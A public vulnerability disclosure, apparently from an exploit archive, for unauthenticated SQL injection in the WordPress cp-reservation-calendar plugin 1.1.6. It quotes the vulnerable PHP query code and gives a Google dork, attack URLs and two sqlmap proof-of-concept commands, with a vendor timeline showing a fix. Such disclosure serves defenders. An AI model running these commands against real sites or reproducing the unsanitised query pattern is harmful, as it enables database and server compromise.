@@ -1,0 +1,112 @@
+# Exploit Title: WordPress: cp-reservation-calendar 1.1.6  SQLi injection]
+# Date: 2015-09-15
+# Google Dork: Index of /wp-content/plugins/cp-reservation-calendar/
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Software Link: https://downloads.wordpress.org/plugin/cp-reservation-calendar.zip
+# Version: 1.1.6
+# OWASP Top10: A1-Injection
+
+A vulnerability has been detected in the WordPress cp reservation calendar Plugin v1.6.
+The vulnerability allows remote attackers to inject SQL commands.
+The sql injection vulnerability is located in the `dex_reservations.php` file.
+Remote attackers are able to execute own sql commands by manipulation of requested parameters. 
+
+The security risk of the sql injection vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 8.6.
+Exploitation of the remote sql injection web vulnerability requires no user interaction or privilege web-application user account.
+Successful exploitation of the remote sql injection results in database management system, web-server and web-application compromise.
+
+============================
+vulnerable function code...
+============================
+
+function dex_reservations_calendar_load2() {
+    global $wpdb;
+	if ( ! isset( $_GET['dex_reservations_calendar_load2'] ) || $_GET['dex_reservations_calendar_load2'] != '1' )
+		return;
+    @ob_clean();
+    header("Cache-Control: no-store, no-cache, must-revalidate");
+    header("Pragma: no-cache");
+
+    //following line is vulnerable...
+
+    $calid = str_replace  (TDE_RESERVATIONCAL_PREFIX, "",$_GET["id"]);
+    $query = "SELECT * FROM ".TDE_RESERVATIONCALENDAR_DATA_TABLE." where ".TDE_RESERVATIONDATA_IDCALENDAR."='".$calid."'";
+    $row_array = $wpdb->get_results($query,ARRAY_A);
+    foreach ($row_array as $row)
+    {        
+        $d1 =  date("m/d/Y", strtotime($row[TDE_RESERVATIONDATA_DATETIME_S])); 
+        $d2 =  date("m/d/Y", strtotime($row[TDE_RESERVATIONDATA_DATETIME_E]));
+
+        echo $d1."-".$d2."\n";
+        echo $row[TDE_RESERVATIONDATA_TITLE]."\n";
+        echo $row[TDE_RESERVATIONDATA_DESCRIPTION]."\n*-*\n";
+    }
+
+    exit();
+}
+
+The following URL executes vulnerable function:
+
+http://localhost/wordpress/?action=dex_reservations_calendar_load2&dex_reservations_calendar_load2=1&id=1
+------------------------------------------------------------------------------------
+POC using sqlmap tool::::
+
+python sqlmap.py --url="http://localhost/wordpress/?action=dex_reservations_calendar_load2&dex_reservations_calendar_load2=1&id=1"
+ -p id --level=5 --risk=3 --dbms="MySQL" --dbs
+
+##########################################################################
+
+The following URL is too vulnerable
+
+http://localhost/wordpress/?action=dex_reservations_check_posted_data
+
+post parameters::::
+-------------------------------------
+dex_reservations_post=1&dex_item=1
+------------------------------------
+
+An unauthenticated user can use the following URL to inject malicious SQL code.
+[dex_item] on POST parameter is vulnerable
+
+======================
+   vulnerable code 
+=====================
+
+is located in `dex_reservations.php`
+
+function code..
+
+function dex_reservations_get_option ($field, $default_value)
+{
+    global $wpdb, $dex_option_buffered_item, $dex_option_buffered_id;
+    if ($dex_option_buffered_id == CP_CALENDAR_ID)
+        $value = $dex_option_buffered_item->$field;
+    else
+    {
+       $myrows = $wpdb->get_results( "SELECT * FROM ".DEX_RESERVATIONS_CONFIG_TABLE_NAME." WHERE id=".CP_CALENDAR_ID );
+       $value = $myrows[0]->$field;
+       $dex_option_buffered_item = $myrows[0];
+       $dex_option_buffered_id  = CP_CALENDAR_ID;
+    }
+    if ($value == '' && $dex_option_buffered_item->calendar_language == '')
+        $value = $default_value;
+    return $value;
+}
+
+
+When this function is called the defined CP_CALENDAR_ID must contains an integer but it isn't validating the parameter
+[ CP_CALENDAR_ID ]
+---------------------------------------------------------------------------- 
+POC using sqlmap tool::::
+
+python sqlmap.py --url="http://localhost/wordpress/?action=dex_reservations_check_posted_data" --data="dex_reservations_post=1&dex_item=1"
+ -p dex_item --dbms="MySQL" --level=5 --risk=3
+
+
+ #############
+ time-line
+
+ 2015-03-01: vulnerability found
+ 2015-03-09: reported to vendor
+ 2015-03-21-: released cp_reservation_calendar v1.1.7
+ 2015-09-15: full disclosure
